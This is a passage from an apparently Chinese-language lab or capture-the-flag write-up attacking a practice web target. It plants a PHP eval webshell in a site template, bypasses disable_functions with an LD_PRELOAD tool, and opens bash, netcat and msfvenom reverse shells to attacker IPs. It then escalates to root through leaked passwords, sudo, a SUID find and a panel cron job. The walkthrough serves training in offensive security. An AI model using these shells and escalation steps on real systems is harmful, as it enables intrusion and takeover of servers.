^/(config|content|skins|temp|upload)/.*\.(php|jsp|asp|aspx|cgi|sql|lock)$ [NC]</span><br><span class="line">RewriteRule .*$ - [F,L]</span><br><span class="line">RewriteCond %&#123;REQUEST_URI&#125; ^/admini/(.+)[^index|login|html].*\.php$ [NC]</span><br><span class="line">RewriteRule .*$ - [F,L]</span><br><span class="line">RewriteCond %&#123;REQUEST_URI&#125; ^/inc/(.+)[^verifycode|lable/lable|lable/lable_edit|pay/alipay|pay/tenpay|models/index].*\.php$ [NC]</span><br></pre></td></tr></table></figure>
+<p>与此同时在资源管理中也发现了文件上传点，但是无法上传 php 类型文件<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2018.50.56.png" alt="截屏2022-07-10 18.50.56"></p>
+<h4 id="修改模板获取shell"><a href="#修改模板获取shell" class="headerlink" title="修改模板获取shell"></a>修改模板获取shell</h4><p>后台首页中还存在模板管理，可以对网站模板进行编辑，选择编辑模板<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2019.04.07.png" alt="截屏2022-07-10 19.04.07"></p>
+<p>在<code>index.php</code>中插入一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mac&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2019.11.12.png" alt="截屏2022-07-10 19.11.12"></p>
+<p>使用蚁剑连接木马失败，改用菜刀后连接成功<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2019.13.04.png" alt="截屏2022-07-10 19.13.04"></p>
+<p>在<code>/home/host123</code>中发现第一个flag</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aad386cf0e9359025d874b8c1c331099</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2003.40.44.png" alt="截屏2022-07-11 03.40.44"></p>
+<h2 id="0x03-主机权限提升"><a href="#0x03-主机权限提升" class="headerlink" title="0x03 主机权限提升"></a>0x03 主机权限提升</h2><h3 id="绕过disable-funcations"><a href="#绕过disable-funcations" class="headerlink" title="绕过disable_funcations"></a>绕过disable_funcations</h3><p>尝试执行命令，但是命令执行失败<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2021.22.23.png" alt="截屏2022-07-10 21.22.23"></p>
+<p>创建<code>phpinfo.php</code>查看是否存在过滤函数<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2021.24.49.png" alt="截屏2022-07-10 21.24.49"><br>查看<code>disabled_funcations</code>中发现多个过滤函数</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passthru,exec,system,chroot,chgrp,chown,shell_exec,popen,proc_open,pcntl_exec,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>bypass_disablefunc_via_LD_PRELOAD</code>项目可以帮助我们绕过限制，它主要利用遗漏的PHP函数<code>putenv</code>来执行命令，首先上传<code>bypass_disablefunc_x64.so</code>和<code>bypass_disablefunc.php</code></p>
+<p><strong>项目地址：<a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></strong></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2021.32.18.png" alt="截屏2022-07-10 21.32.18"></p>
+<p>尝试通过绕过脚本执行命令，缺点是执行时间会比较久</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bypass_disablefunc.php?cmd=ifconfig&amp;outpath=/tmp/xx&amp;sopath=/www/wwwroot/www.ddd4.com/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2021.38.01.png" alt="截屏2022-07-10 21.38.01"></p>
+<p>尝试执行反弹shell，但均以失败告终</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bypass_disablefunc.php?cmd=bash%20-i%20&amp;&gt;/dev/tcp/192.168.0.110/8888%20&lt;&amp;1&amp;outpath=/tmp/xx&amp;sopath=/www/wwwroot/www.ddd4.com/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2021.49.06.png" alt="截屏2022-07-10 21.49.06"></p>
+<h3 id="MSF反弹shell"><a href="#MSF反弹shell" class="headerlink" title="MSF反弹shell"></a>MSF反弹shell</h3><p>使用 MSF 生成用于反弹shell payload</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.0.113 lport=4444 -f elf &gt; ~/Desktop/macmsf</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2022.04.53.png" alt="截屏2022-07-10 22.04.53"></p>
+<p>在本地开启 MSF 监听</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf &gt; set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">msf &gt; set lhost 192.168.0.113</span><br><span class="line">msf &gt; set lport 4444</span><br><span class="line">msf &gt; exploit -j </span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2022.04.43.png" alt="截屏2022-07-10 22.04.43"><br>上传木马<code>macmsf</code>，同时为其设置执行权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bypass_disablefunc.php?cmd=chmod%20777%20macmsf&amp;outpath=/tmp/xx&amp;sopath=/www/wwwroot/www.ddd4.com/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2022.09.34.png" alt="截屏2022-07-10 22.09.34"></p>
+<p>尝试执行木马，成功收到反弹shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bypass_disablefunc.php?cmd=./macmsf&amp;outpath=/tmp/xx&amp;sopath=/www/wwwroot/www.ddd4.com/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2022.10.39.png" alt="截屏2022-07-10 22.10.39"></p>
+<p>通过 MSF 建立交互shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.113 9001 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2003.26.15.png" alt="截屏2022-07-11 03.26.15"></p>
+<p>在本地监听 9001 端口，成功收到交互shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -nvlp 9001</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2003.26.05.png" alt="截屏2022-07-11 03.26.05"></p>
+<p>如果想要建立 stty，可通过<code>crtl + z</code>的方式调入后台，使用如下命令可成功建立</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">crtl + z</span><br><span class="line">stty raw -echo</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2003.34.50.png" alt="截屏2022-07-11 03.34.50"></p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>在 Linux 中信息收集主要用到三个工具，分别是<code>LinEnum.sh</code>、<code>Linux-exploit-suggester.sh</code>、<code>linuxprivchecker.py</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LinEnum.sh：收集系统信息，比如特殊文件的权限、suid文件信息、网络端口信息</span><br><span class="line">Linux-exploit-suggester.sh：检测是否存在可用于提权的内核CVE漏洞</span><br><span class="line">linuxprivchecker.py：检测权限</span><br></pre></td></tr></table></figure>
+
+<p><strong>项目地址1：<a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></strong><br><strong>项目地址2：<a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></strong><br><strong>项目地址3：<a target="_blank" rel="noopener" href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a></strong></p>
+<p>使用 Python 搭建 http 服务</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p>进入<code>/tmp</code>目录中运行命令下载文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.0.110/LinEnum.sh</span><br><span class="line">wget http://192.168.0.110/Linux-exploit-suggester.sh</span><br><span class="line">wget http://192.168.0.110/linuxprivchecker.py</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2003.55.03.png" alt="截屏2022-07-11 03.55.03"><br>首先使用<code>LinEnum.sh</code>进行信息收集</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh LinEnum.sh</span><br></pre></td></tr></table></figure>
+<p>在其中发现存在<code>suid</code>权限的文件<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2004.22.44.png" alt="截屏2022-07-11 04.22.44"></p>
+<p>同时发现 root 用户密码<code>yanisy123</code>、news_ddd4_com 用户密码<code>news_ddd4_com</code>、news 用户密码<code>123456</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2003.57.08.png" alt="截屏2022-07-11 03.57.08"></p>
+<p>接下来是使用<code>Linux-exploit-suggester.sh</code>进行信息收集</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh Linux-exploit-suggester.sh</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2004.00.36.png" alt="截屏2022-07-11 04.00.36"><br>最后使用<code>linuxprivchecker.py</code>进行信息收集</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 linuxprivchecker.py</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2004.02.29.png" alt="截屏2022-07-11 04.02.29"></p>
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><h4 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h4><p>在信息收集中我们已经拿到 root 用户的密码，尝试使用 sudo 命令进行权限提升</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>
+<p>但是结果显示失败，可能是用户 host123 的密码为<code>yanisy123</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su host123</span><br></pre></td></tr></table></figure>
+<p>成功登录用户 host123，查看当前权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2004.16.42.png" alt="截屏2022-07-11 04.16.42"><br>当前权限可执行<code>root</code>的全部命令，因此可直接获取第二个flag</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su root</span><br><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2004.18.45.png" alt="截屏2022-07-11 04.18.45"><br>第二个flag为<code>74cc1c60799e0a786ac7094b532f01b1</code></p>
+<h4 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h4><p>查找存在 suid 的文件，成功在其中发现 find 命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -perm -u=s 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2004.21.19.png" alt="截屏2022-07-11 04.21.19"></p>
+<p>利用 find 命令可获取 root 权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -exec /usr/bin/awk &#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27; \; </span><br><span class="line">touch test</span><br><span class="line">find test -exec whoami \;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2004.26.44.png" alt="截屏2022-07-11 04.26.44"></p>
+<h4 id="宝塔面板提权"><a href="#宝塔面板提权" class="headerlink" title="宝塔面板提权"></a>宝塔面板提权</h4><p>在<code>/home/host123/bt.txt</code>发现宝塔地址以及账号密码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Bt-Panel: http://116.27.229.43:8888/944906b5</span><br><span class="line">username: gpeqnjf4</span><br><span class="line">password: d12924fa</span><br></pre></td></tr></table></figure>
+<p>使用该账号密码登录<code>http://www.ddd4.com:8888/944906b5</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2004.31.19.png" alt="截屏2022-07-11 04.31.19"></p>
+<p>在后台中写入计划任务</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &amp;&gt;/dev/tcp/192.168.0.113/8889 &lt;&amp;1</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2004.36.44.png" alt="截屏2022-07-11 04.36.44"></p>
+<p>成功拿到反弹shell，权限为root<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2004.37.38.png" alt="截屏2022-07-11 04.37.38"></p>
+<h2 id="0x04-内网横向渗透"><a href="#0x04-内网横向渗透" class="headerlink" title="0x04 内网横向渗透"></a>0x04 内网横向渗透</h2><h3 id="基础环境信息收集"><a href="#基础环境信息收集" class="headerlink" title="基础环境信息收集"></a>基础环境信息收集</h3><p>查看当前网络环境</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2003.04.15.png" alt="截屏2022-07-12 03.04.15"><br>目标存在双网卡，分别对应IP如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.105</span><br><span class="line">10.10.10.132</span><br></pre></td></tr></table></figure>
